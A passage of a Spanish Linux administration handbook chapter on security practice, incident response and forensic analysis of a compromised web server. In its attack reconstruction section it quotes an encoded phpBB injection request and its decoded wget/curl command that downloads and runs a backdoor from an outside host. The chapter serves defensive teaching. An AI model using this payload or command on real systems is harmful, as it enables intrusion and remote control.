	  <para>Puede parecerle extraño que no se mencionen roles cuando se crean nuevas reglas. SELinux sólo utiliza los dominios para saber qué operaciones están permitidas. El rol sólo interviene indirectamente permitiéndole al usuario cambiar a otro dominio. SELinux está basado en una teoría conocida como <emphasis>forzado de tipos</emphasis> («Type Enforcement») y el tipo es el único elemento que importa al otorgar permisos.</para>
        </sidebar>
      </section>
      <section>
        <title>Compilación de los archivos</title>

	<para>Una vez que los 3 archivos (<filename>ejemplo.if</filename>, <filename>ejemplo.fc</filename> y <filename>ejemplo.te</filename>) está a la altura de sus expectativas de las nuevas reglas, simplemente ejecute <command>make NAME=devel</command> para generar un módulo en el archivo <filename>ejemplo.pp</filename> (puede cargarlo inmediatamente con <command>semodule -i ejemplo.pp</command>). Si define varios módulos, <command>make</command> creará todos los archivos <filename>.pp</filename> correspondientes.</para>
      </section>
    </section>
  </section>
  <section id="sect.other-security-considerations">
    <title>Otras consideraciones relacionadas con la seguridad</title>

    <para>La seguridad no es sólo un problema técnico: se trata sobre todo de buenas prácticas y de una buena compresión de los riesgos. Esta sección revisa algunos de los riesgos más comunes, así como también unas pocas prácticas recomendadas que deberían, dependiendo del caso, aumentar la seguridad o reducir el impacto de un ataque exitoso.</para>
    <section>
      <title>Riesgos inherentes de las aplicaciones web</title>

      <para>El carácter universal de las aplicaciones web llevaron a su proliferación. Usualmente se ejecutan varias en paralelo: correo web, wiki, sistema de gestión, foros, galería de fotos, blog, etc. La mayoría de estas aplicaciones están basadas en la pila «LAMP» (<emphasis>Linux, Apache, MySQL, PHP</emphasis>). Desafortunadamente, muchas de estas aplicaciones también fueron escritas sin considerar los problemas de seguridad. Los datos que provienen del exterior, demasiado seguido, son utilizados luego de escasa o nula validación. Se pueden proveer valores creados especiales para generar que una llamada a un programa ejecute otro en cambio. Con el paso del tiempo se corrigieron muchos de los problemas más obvios, pero aparecen nuevos problemas regularmente.</para>

      <sidebar>
        <title><emphasis>VOCABULARIO</emphasis> Inyección SQL</title>

	<para>Cuando un programa agrega datos a una consulta SQL de forma insegura, es vulnerable a inyecciones SQL; este nombre hace referencia al acto de cambiar un parámetro de forma que la consulta ejecutada por el programa resultará diferente a la esperada, bien para dañar la base de datos o para acceder a datos a los que normalmente no tendría acceso. <ulink type="block" url="http://es.wikipedia.org/wiki/Inyecci%C3%B3n_SQL" /></para>
        <indexterm><primary>inyección SQL</primary></indexterm>
      </sidebar>

      <para>Por lo tanto, es obligatorio actualizar las aplicaciones web regularmente, para que un «cracker» (sea un atacante profesional o un «script kiddy») no pueda aprovecharse de una vulnerabilidad conocida. El riesgo real depende de cada caso, varía entre la destrucción de datos a la ejecución de código arbitrario, incluyendo la desfiguración del sitio web.</para>
    </section>
    <section>
      <title>Saber qué esperar</title>

      <para>Generalmente se utiliza una vulnerabilidad en una aplicación web como punto de partida para intentos de «cracking». Lo que sigue es una breve revisión de las consecuencias posibles.</para>

      <sidebar>
        <title><emphasis>VISTA RÁPIDA</emphasis> Filtrado de consultas HTTP</title>

	<para>Apache 2 incluye módulos que permiten filtrar consultas HTTP entrantes. Esto permite bloquear algunos vectores de ataque. Por ejemplo, limitar la longitud de los parámetros puede prevenir un desbordamiento de búfer. De forma más general, puede validar los parámetros inclusive antes de que sean pasados a la aplicación web y puede restringir el acceso según muchos criterios. Inclusive puede combinarlo con actualizaciones dinámicas del firewall, para prohibirle temporalmente el acceso al servidor web a un cliente que infrinja alguna de las reglas.</para>

	<para>Configurar estas verificaciones puede ser una tarea larga y tediosa, pero valdrá la pena cuando la aplicación web que deba desplegar tenga un historial de seguridad dudoso.</para>

	<para><emphasis>mod-security2</emphasis> (en el paquete <emphasis role="pkg">libapache2-mod-security2</emphasis>) es el módulo principal de este tipo. Incluso viene con muchas reglas listas para ser utilizadas y de instalación sencilla (en el paquete <emphasis role="pkg">modsecurity-crs</emphasis>).</para>
        <indexterm><primary><emphasis role="pkg">libapache-mod-security</emphasis></primary></indexterm>
        <indexterm><primary><emphasis>mod-security</emphasis></primary></indexterm>
      </sidebar>

      <para>Las consecuencias de una intrusión tendrán varios niveles de obviedad dependiendo de las motivaciones del atacante. Los «<emphasis>script kiddies</emphasis>» sólo aplican recetas que encuentran en sitios web; generalmente desfiguran una página web o borran datos. En casos más sutiles agregan contenido invisible a las páginas web para mejorar las referencias a sus propios sitios en los motores de búsqueda.</para>

      <para>Un atacante más avanzado irá más allá. Un escenario desastroso podría ser como sigue: el atacante obtiene la habilidad de ejecutar programas como el usuario <literal>www-data</literal>, pero ejecutar una orden necesita demasiadas manipulaciones. Para hacer su tarea más sencilla, instala otra aplicación web diseñada específicamente para ejecutar remotamente muchas órdenes distintas, como navegar el sistema de archivos, examinar permisos, subir o descargar archivos, ejecutar programas o inclusive proveer una consola de red. Generalmente, la vulnerabilidad le permitirá ejecutar <command>wget</command> para descargar algún malware en <filename>/tmp/</filename> y luego ejecutarlo. Usualmente se descarga dicho malware de un sitio web extranjero que fue comprometido con anterioridad y servirá para cubrir sus huellas y hacer más difícil rastrear el origen real del ataque.</para>

      <para>En este punto el atacante tiene suficiente libertad de movimiento y, generalmente, instalan un «<emphasis>bot</emphasis>» IRC (un robot que se conecta a un servidor IRC por el que se lo puede controlar). Generalmente se lo utiliza para compartir archivos ilegales (copias no autorizadas de películas o software, etc.). Un atacante tenaz inclusive podría desear ir más allá todavía. La cuenta <literal>www-data</literal> no provee acceso completo al equipo, el atacante intentará obtener permisos de administrador. Esto no debería ser posible, pero si la aplicación web no estaba actualizada es posible también que el núcleo y otros programas tampoco estén actualizados; esto a veces deriva de una decisión del administrador que, a pesar de conocer la vulnerabilidad, descuidó la actualización del sistema ya que no existen usuarios locales. El atacante podrá aprovechar una segunda vulnerabilidad para obtener permisos de root.</para>

      <sidebar>
        <title><emphasis>VOCABULARIO</emphasis> Escalada de privilegios</title>

	<para>Este término cubre cualquier cosa que pueda ser utilizada para obtener más permisos de los que normalmente tendría un usuario normal. El programa <command>sudo</command> está diseñado específicamente para proveer permisos de administración a algunos usuarios. Pero también se utiliza el mismo término para describir el acto en el que un atacante aprovecha una vulnerabilidad para obtener permisos indebidos.</para>
      </sidebar>

      <para>Ahora el atacante es dueño de la máquina; usualmente intentarán mantener este acceso privilegiado tanto como les sea posible. Esto involucra instalar un «<emphasis>rootkit</emphasis>», un programa que reemplazará algunos componentes del sistema para que el atacante pueda obtener privilegios de administrador más adelante; el «rootkit» también intentará esconder su propia existencia así como también cualquier rastro de la intrusión. Un programa <command>ps</command> comprometido omitirá algunos procesos, <command>netstat</command> no mostrará algunas conexiones activas, etc. Utilizando los permisos de root, el atacante pudo observar el sistema completo pero no encontró datos importantes; por lo que intentará acceder a otras máquinas en la red corporativa. Analizando la cuenta del administrador y los archivos históricos, el atacante encuentra las máquinas a las que se accede frecuentemente. Puede interceptar la contraseña de alguno de los administradores reemplazando <command>sudo</command> o <command>ssh</command> con una versión comprometida, y luego utilizar esta información en los servidores detectados… y propagar la intrusión de allí en más.</para>

      <para>Este es un escenario de pesadilla que se puede prevenir con varias medidas. Las siguientes secciones describirán algunas de estas medidas.</para>
    </section>
    <section id="sect.choosing-the-software-wisely">
      <title>Selección prudente de software</title>

      <para>Una vez que se conocen los problemas de seguridad, debe tenerlos en cuenta en cada paso del proceso de desplegado de un servicio, especialmente al elegir el software que instalar. Muchos sitios web, como <literal>SecurityFocus.com</literal>, mantienen una lista de vulnerabilidades descubiertas recientemente, lo cual le puede dar una idea del historial de seguridad de un software antes de desplegarlo. Por supuesto, debe balancear esta información con la popularidad de dicho software: un programa más utilizado es un objetivo más tentador y, consecuentemente, será investigado más en detalle. Por el otro lado, un programa de nicho podría estar lleno de huecos de seguridad que nunca son publicados debido a la falta de interés en una auditoría de seguridad.</para>

      <sidebar>
        <title><emphasis>VOCABULARIO</emphasis> Auditoría de seguridad</title>

	<para>Una auditoría de seguridad es el proceso de leer y analizar a fondo el código fuente de algún software, buscando potenciales vulnerabilidades de seguridad que pueda contener. Usualmente, dichas auditorías son proactivas y se las realizan para asegurar que un programa cumple ciertos requisitos de seguridad.</para>
      </sidebar>

      <para>En el mundo del Software Libre, generalmente hay mucha variedad de opciones y elegir un software sobre otro debería ser una decisión basada en el criterio local. Más funcionalidad implica un aumento del riesgo de una vulnerabilidad escondida en el código; elegir el programa más avanzado para una tarea podría ser contraproducente, usualmente elegir el programa más simple que cumpla los requisitos es un mejor enfoque.</para>

      <sidebar>
        <title><emphasis>VOCABULARIO</emphasis> Vulnerabilidad de día cero («zero-day exploit»)</title>

	<para>Un ataque mediante una <emphasis>vulnerabilidad de día cero</emphasis> es difícil de prevenir; el término abarca una vulnerabilidad que todavía no es conocida por los autores del programa.</para>
      </sidebar>
    </section>
    <section id="sect.managing-a-machine-as-a-whole">
      <title>Gestión de una máquina como un todo</title>

      <para>La mayoría de las distribuciones Linux instalan de forma predeterminada una cantidad de servicios Unix y muchas herramientas. En muchos casos, no son necesarios para el funcionamiento adecuado de los servicios configurados por el administrador en la máquina. Como guía general en materia de seguridad, es mejor desinstalar todo el software innecesario. En efecto, no tiene sentido asegurar un servidor FTP si se puede utilizar una vulnerabilidad en otro servicio no utilizado para obtener permisos de administrador en todo el equipo.</para>

      <para>De la misma forma, generalmente se configurarán los firewalls sólo para permitir acceder a los servicios que deban estar accesibles públicamente.</para>

      <para>Los equipos actuales son suficientemente potentes para poder albergar varios servicios en la misma máquina física. Desde un punto de vista económico, dicha posibilidad es interesante: un sólo equipo a administrar, menor consumo de energía, etc. Desde el punto de vista de seguridad, sin embargo, esta elección puede ser un problema. Un servicio comprometido puede proveer acceso a toda la máquina, que a su vez compromete los otros servicios en el mismo equipo. Se puede mitigar este riesgo aislando los servicios. Puede lograrlo mediante virtualización (cada servicio albergado en una máquina virtual o contenedor dedicado) o bien con AppArmor/SELinux (que cada demonio de servicio tenga un conjunto de permisos adecuado).</para>
    </section>
    <section id="sect.users-are-players">
      <title>Los usuarios también son parte</title>

      <para>Discutir sobre seguridad inmediatamente trae a la mente proteger en contra de ataques de «cracker» anónimos escondidos en la jungla de Internet; pero se suele olvidar que el riesgo también proviene desde adentro: un empleado a punto de dejar la empresa podría descargar archivos sensibles en un proyecto importante y venderlos a la competencia, un vendedor descuidado podría dejar su escritorio sin bloquear su sesión durante una reunión con un nuevo prospecto, un usuario atolondrado podría borrar el directorio incorrecto por error, etc.</para>

      <para>La respuesta a estos riesgos puede involucrar soluciones técnicas: limitar los permisos otorgados a los usuarios a aquellos estrictamente necesarios y tener respaldos son obligatorios. Pero en muchos casos la protección adecuada involucrará entrenar a los usuarios a evitar los riesgos.</para>

      <sidebar>
        <title><emphasis>VISTA RÁPIDA</emphasis> <emphasis role="pkg">autolog</emphasis></title>

	<para>El paquete <emphasis role="pkg">autolog</emphasis> provee un programa que automáticamente desconecta usuarios inactivos luego de un tiempo configurable. También permite matar procesos de usuarios que permanecen después que finalizó su sesión, evitando así que los usuarios ejecuten demonios.</para>
      </sidebar>
    </section>
    <section id="sect.physical-security">
      <title>Seguridad física</title>

      <para>No tiene sentido asegurar redes y servicios si los equipos en sí no están protegidos. Los datos importantes merecen estar almacenados en disco duros que puede cambiar en caliente en arrays RAID, porque los discos duros eventualmente fallan y la disponibilidad de los datos es necesaria. Pero si cualquier repartidor de pizza puede ingresar al edificio, ingresar a la sala de servidores y huir con unos pocos discos duros específicos, no se cumple una parte de la seguridad. ¿Quién puede ingresar a la sala de servidores? ¿Está monitorizado el acceso? Estas cuestiones merecen ser consideradas (y respondidas) cuando se evalúa la seguridad física.</para>

      <para>La seguridad física también incluye tener en cuenta los riesgos de accidentes, como incendios. Este riesgo particular es lo que justifica medios de respaldo en edificios separados, o al menos en una caja de seguridad a prueba de incendios.</para>
    </section>
    <section>
      <title>Responsabilidad legal</title>

      <para>De formas más o menos implícita, un administrador recibe la confianza de sus usuarios así como también la de los usuarios de la red en general. Por lo tanto, deberían evitar cualquier descuido que pueda ser aprovechado por gente con malas intenciones.</para>

      <para>Un atacante que tome control de su equipo y luego lo utilice como una base avanzada (conocido como «sistema de retransmisión») desde la que realizar otras actividades nefastas podría causarle problemas legales, debido a que aquellos atacados inicialmente verían que el ataque proviene de su sistema y, por lo tanto, considerarlo como el atacante (o un cómplice). En muchos casos, el atacante utilizará su servidor para enviar spam, lo que no debería tener demasiado impacto (excepto la posibilidad de registrarlo en listas negras que limitarían su capacidad de enviar correos legítimos), pero no será agradable. En otros casos, puede causar problemas más importantes desde su máquina, por ejemplo ataques de denegación de servicio. Esto a veces generará pérdida de ingresos ya que los servicios legítimos no estarán disponibles y podría destruir datos; a veces esto también implicará costos reales, ya que la parte atacada puede iniciar procedimientos legales en su contra. Los titulares de los derechos pueden enjuiciarlo si se comparte desde su servidor una copia no autorizada de una obra protegida por la legislación de derechos de copia, así como también otras empresas, obligadas por acuerdos de nivel de servicio, si deben pagar penalidades por el ataque desde su máquina.</para>

      <para>Cuando ocurren estas situaciones, usualmente no basta con alegar inocencia; cuando menos necesitará evidencia convincente que muestre actividad sospechosa en su sistema que proviene de una dirección IP dada. Esto no será posible si descuida las recomendaciones de este capítulo y deja que el atacante obtenga acceso a una cuenta privilegiada (root en particular) y la utilice para cubrir sus huellas.</para>
    </section>
  </section>
  <section id="sect.dealing-with-compromised-machine">
    <title>Tratamiento de una máquina comprometida</title>

    <para>A pesar de las mejores intenciones y sin importar cuán cuidadosamente diseñe la política de seguridad, un administrador eventualmente se enfrentará a un secuestro. Esta sección provee algunas directrices sobre cómo reaccionar frente a estas circunstancias desafortunadas.</para>
    <section>
      <title>Detección y visualización de la intrusión</title>

      <para>El primer paso de la reacción frente a una intrusión es estar al tanto de la misma. Esto no es siempre obvio, especialmente sin una infraestructura de monitorización adecuada.</para>

      <para>A veces no se detectan los actos de intrusión hasta que tienen consecuencias directas en los servicios legítimos albergados en la máquina, como lentitud en las conexiones, algunos usuarios no se pueden conectar o cualquier otro tipo de funcionamiento defectuoso. El administrador que se enfrenta a estos problemas debe revisar cuidadosamente la máquina y escrutar en detalle aquello que no funciona como corresponde. Generalmente este es el momento en el que descubren un proceso inusual, por ejemplo uno llamado <literal>apache</literal> en lugar del estándar <literal>/usr/sbin/apache2</literal>. Si seguimos con dicho ejemplo, debemos anotar el identificador de proceso y revisar <filename>/proc/<replaceable>pid</replaceable>/exe</filename> para ver qué programa está ejecutando dicho proceso:</para>

      <screen>
<computeroutput># </computeroutput><userinput>ls -al /proc/3719/exe</userinput>
<computeroutput>lrwxrwxrwx 1 www-data www-data 0 2007-04-20 16:19 /proc/3719/exe -&gt; /var/tmp/.bash_httpd/psybnc</computeroutput>
      </screen>

      <para>¿Un programa instalado en <filename>/var/tmp/</filename> que ejecuta como el servidor web? Sin duda la máquina está comprometida.</para>

      <para>Este sólo es un ejemplo, pero muchas otras pistas pueden encender la lámpara del administrador:</para>
      <itemizedlist>
        <listitem>
	  <para>una opción a un programa que ya no funciona; la versión del software que el programa dice ser no coincide con la versión que se supone está instalada según <command>dpkg</command>;</para>
        </listitem>
        <listitem>
	  <para>un prompt de órdenes o mensaje de sesión que indica que la última conexión provino de un servidor desconocido en otro continente;</para>
        </listitem>
        <listitem>
	  <para>errores causados porque la partición <filename>/tmp/</filename> está llena, resultado de múltiples copias ilegales de películas;</para>
        </listitem>
        <listitem>
	  <para>etc.</para>
        </listitem>
      </itemizedlist>
    </section>
    <section>
      <title>Desconexión del servidor</title>

      <para>En prácticamente todos los casos, la intrusión proviene de la red y el atacante necesita una red funcional para alcanzar sus objetivos (acceder a datos confidenciales, compartir archivos ilegales, esconder su identidad utilizando la máquina como restransmisor, etc.). Desconectar el equipo de la red evitará que el atacante logre estos objetivos si es que no los alcanzó para ese momento.</para>

      <para>Esto podría ser posible sólamente si puede acceder físicamente al servidor. Cuando se alberga el servidor en un centro de datos en la otra punta del país, o si no puede acceder al servidor de niguna otra forma, usualmente es buena idea comenzar a obtener información importante (vea <xref linkend="sect.keeping-everything-that-could-be-used-as-evidence" />, <xref linkend="sect.forensic-analysis" /> y <xref linkend="sect.reconstituting-the-attack-scenario" />), luego aislar el servidor tanto como sea posible apagando tantos servicios como pueda (generalmente, todo excepto <command>sshd</command>). Este caso sigue siendo incómodo ya que no se puede descartar la posibilidad que el atacante tenga acceso SSH al igual que el administrador; esto dificulta «limpiar» las máquinas.</para>
    </section>
    <section id="sect.keeping-everything-that-could-be-used-as-evidence">
      <title>Preservación de todo lo que pueda utilizar como evidencia</title>

      <para>Entender el ataque y/o establecer una acción legal en contra del atacante requerirá copias de todos los elementos importantes; esto incluye el contenido de los discos, una lista de todos los procesos en ejecución y las conexiones establecidas. Incluso podría utilizar el contenido de la RAM pero, rara vez se lo utiliza realmente.</para>

      <para>En el ápice de la acción, los administradores generalmente están tentados de realizar muchas verificaciones en la máquina comprometida; generalmente esto no es una buena idea. Potencialmente, todo programa está comprometido y puede borrar porciones de la evidencia. Debería restringir las verificaciones a un conjunto mínimo (<command>netstat -tupan</command> para conexiones de red, <command>ps auxf</command> para una lista de procesos, <command>ls -alr /proc/[0-9]*</command> para un poco más de información sobre los programas en ejecución), y debe anotar cuidadosamente cada verificación que realice.</para>

      <sidebar>
        <title><emphasis>PRECAUCIÓN</emphasis> Análisis en caliente</title>

	<para>Puede parecer tentandor analizar el equipo mientras ejecuta, especialmente cuando no puede acceder físicamente al servidor; debe evitarlo: simplemente no puede confiar en los programas instalados actualmente en el sistema comprometido. Es muy probable que un programa <command>ps</command> comprometido esconda proceso, o que un <command>ls</command> comprometido esconda archivos. ¡A veces incluso el núcleo está comprometido!</para>

	<para>Si necesita dicho análisis en caliente, debe tener cuidado de sólo utilizar programas en los que sabe que puede confiar. Una buena forma de hacer esto sería tener un CD de rescate con programas impolutos, o un espacio de red compartido en modo de solo lectura. Sin embargo, aún estas medidas pueden no ser suficientes si el núcleo en sí fue comprometido.</para>
      </sidebar>

      <para>Una vez que guardó los elementos «dinámicos», el siguiente paso es almacenar una imagen completa del disco duro. Realizar dicha imagen es imposible si el sistema de archivos continúa evolucionando, razón por la que debe volver a montarlo en modo sólo de lectura. La solución más simple generalmente es detener brutalmente el servidor (luego de ejecutar <command>sync</command>) y luego reiniciar desde un CD de rescate. Debe copiar cada partición con una herramienta como <command>dd</command>; luego puede enviar estas imágenes a otro servidor (posiblemente con la conveniente herramienta <command>nc</command>). Otra posiblidad que puede ser aún más sencilla: simplemente quite el disco de la máquina y reemplácelo con otro al que pueda dar formato y reinstalar.</para>
    </section>
    <section>
      <title>Reinstalación</title>
      <indexterm><primary>puerta trasera</primary></indexterm>

      <para>No debería volver a poner en línea al servidor sin reinstalarlo completamente. Si el compromiso fue serio (obtuvieron permisos de administrador), prácticamente no existe otra forma de estar seguro que se ha eliminado todo lo que el atacante podría haber dejado (<emphasis>puertas traseras</emphasis> — «backdoors» — en particular). Por supuesto, también debe aplicar todas las últimas actualizaciones de seguridad para solucionar la vulnerabilidad que utilizó el atacante. Idealmente, el análisis del ataque debería indicarle dicho vector de ataque para que pueda estar seguro de solucionarlo; de lo contrario, sólo puede confiar que alguna de las actualizaciones hay corregido la vulnerabilidad.</para>

      <para>No siempre es sencillo reinstalar un servidor remoto; podría involucrar asistencia de la empresa que alberga su equipo, ya que no siempre dichas compañías ofrecen servicios automatizados de reinstalación. Debe tener cuidado de no reinstalar la máquina desde respaldos realizados luego del ataque. Idealmente, sólo debería restaurar los datos, debería instalar el software en sí desde los medios de instalación.</para>
    </section>
    <section id="sect.forensic-analysis">
      <title>Análisis forense</title>

      <para>Ahora que restauró el servicio, es momento de revisar más cuidadosamente las imágenes de disco del sistema comprometido para poder entender el vector de ataque. Cuando monte estas imágenes debe asegurarse de utilizar las opciones <literal>ro,nodev,noexec,noatime</literal> para evitar modificar sus contenidos (incluyendo las marcas temporales de acceso de los archivos) o ejecutar por error los programas comprometidos.</para>

      <para>Seguir las huellas de un escenario de ataque generalmente involucra buscar todo lo que se modificó o ejecutó:</para>
      <itemizedlist>
        <listitem>
	  <para>usualmente es interesante leer los archivos <filename>.bash_history</filename>;</para>
        </listitem>
        <listitem>
	  <para>al igual que enumerar los archivos que fueron creados, modificados o accedidos recientemente;</para>
        </listitem>
        <listitem>
	  <para>el programa <command>strings</command> ayuda a identificar los programas instalados por el atacante, extrayendo las cadenas de texto de un binario;</para>
        </listitem>
        <listitem>
	  <para>los archivos de registro en <filename>/var/log/</filename> usualmente permiten reconstruir una cronología de los eventos;</para>
        </listitem>
        <listitem>
	  <para>herramientas específicas también permiten restaurar el contenido de archivos potencialmente borrados, incluyendo los archivos de registro que generalmente borran los atacantes.</para>
        </listitem>
      </itemizedlist>

      <para>Algunas de estas operaciones pueden simplificarse mediante programas especializados. En particular, el paquete <emphasis role="pkg">sleuthkit</emphasis> proprociona muchas herramientas para analizar un sistema de archivos. Es más sencillo utilizarlo con la interfaz gráfica <emphasis>Autopsy Forensic Browser</emphasis> («navegador forense de autopsias», en el paquete <emphasis role="pkg">autopsy</emphasis>).</para>
      <indexterm><primary>Autopsy Forensic Browser</primary></indexterm>
      <indexterm><primary>The Sleuth Kit</primary></indexterm>
    </section>
    <section id="sect.reconstituting-the-attack-scenario">
      <title>Reconstrucción del escenario de ataque</title>

      <para>Todos los elementos recolectados durante el análisis deberían encajar como piezas de un rompecabezas; usualmente hay una correlación entre la creación de los primeros archivos sospechosos con los registros que muestran la intrusión. Un ejemplo real debería ser más explícito que largos desvaríos teóricos.</para>

      <para>El siguiente registro es un extracto de un archivo <filename>access.log</filename> de Apache:</para>

      <programlisting>
www.falcot.com 200.58.141.84 - - [27/Nov/2004:13:33:34 +0100] "GET /phpbb/viewtopic.php?t=10&amp;highlight=%2527%252esystem(chr(99)%252echr(100)%252echr(32)%252echr(47)%252echr(116)%252echr(109)%252echr(112)%252echr(59)%252echr(32)%252echr(119)%252echr(103)%252echr(101)%252echr(116)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(124)%252echr(124)%252echr(32)%252echr(99)%252echr(117)%252echr(114)%252echr(108)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(45)%252echr(111)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(99)%252echr(104)%252echr(109)%252echr(111)%252echr(100)%252echr(32)%252echr(43)%252echr(120)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(46)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(38))%252e%2527 HTTP/1.1" 200 27969 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
      </programlisting>

      <para>Este ejemplo coincide con el aprovechamiento de una antigua vulnerabilidad de phpBB. <ulink type="block" url="http://secunia.com/advisories/13239/" /> <ulink type="block" url="http://www.phpbb.com/phpBB/viewtopic.php?t=240636" /></para>

      <para>Decodificar esta URL lleva a entender que el atacante logró ejecutar un código PHP, en particular: <command>system("cd /tmp; wget gabryk.altervista.org/bd || curl gabryk.altervista.org/bd -o bd; chmod +x bd; ./bd &amp;")</command>. En efecto, encontramos un archivo <filename>bd</filename> en <filename>/tmp/</filename>. La ejecución de <command>strings /mnt/tmp/bd</command> devuelve, entre otras cadenas, <literal>PsychoPhobia Backdoor is starting...</literal>. Esto realmente parece una puerta trasera.</para>

      <para>Un tiempo después, se utilizó este acceso para descargar, instalar y ejecutar un <emphasis>bot</emphasis> IRC que se conectó a una red IRC clandestina. Luego se podía controlar el bot mediante este protocolo y ordenarle descargar archivos para compartir. Este programa inclusive tiene su propio archivo de registro:</para>

      <programlisting>** 2004-11-29-19:50:15: NOTICE: :GAB!sex@Rizon-2EDFBC28.pool8250.interbusiness.it NOTICE ReV|DivXNeW|504 :DCC Chat (82.50.72.202)
** 2004-11-29-19:50:15: DCC CHAT attempt authorized from GAB!SEX@RIZON-2EDFBC28.POOL8250.INTERBUSINESS.IT
** 2004-11-29-19:50:15: DCC CHAT received from GAB, attempting connection to 82.50.72.202:1024
** 2004-11-29-19:50:15: DCC CHAT connection suceeded, authenticating
** 2004-11-29-19:50:20: DCC CHAT Correct password
(...)
** 2004-11-29-19:50:49: DCC Send Accepted from ReV|DivXNeW|502: In.Ostaggio-iTa.Oper_-DvdScr.avi (713034KB)
(...)
** 2004-11-29-20:10:11: DCC Send Accepted from GAB: La_tela_dell_assassino.avi (666615KB)
(...)
** 2004-11-29-21:10:36: DCC Upload: Transfer Completed (666615 KB, 1 hr 24 sec, 183.9 KB/sec)
(...)
** 2004-11-29-22:18:57: DCC Upload: Transfer Completed (713034 KB, 2 hr 28 min 7 sec, 80.2 KB/sec)</programlisting>

      <para>Estas trazas muestran que se almacenaron dos archivos de video en el servidor desde la dirección IP 82.50.72.202.</para>

      <para>En paralelo, el atacante también descargo un par de archivos adicionales, <filename>/tmp/pt</filename> y <filename>/tmp/loginx</filename>. Ejecutar <command>strings</command> en estos archivos nos provee cadenas como <foreignphrase>Shellcode placed at 0x%08lx</foreignphrase> («código de consola ubicado en 0x%08lx») y <foreignphrase>Now wait for suid shell...</foreignphrase> («esperando consola suid...»). Estos parecen programas que aprovechan vulnerabilidades locales para obtener privilegios de administrador. ¿Consiguieron su objetivo? En este caso, probablemente no, ya que no parecen existir archivos modificados luego de la intrusión original.</para>

      <para>En este ejemplo, se reconstruyó la intrusión completa y podemos deducir que el atacante pudo aprovechar el sistema comprometido por alrededor de tres días; pero el elemento más importante del análisis es que se identificó la vulnerabilidad y el administrador puede asegurarse que la nueva instalación realmente soluciona la vulnerabilidad.</para>
    </section>
  </section>
</chapter>
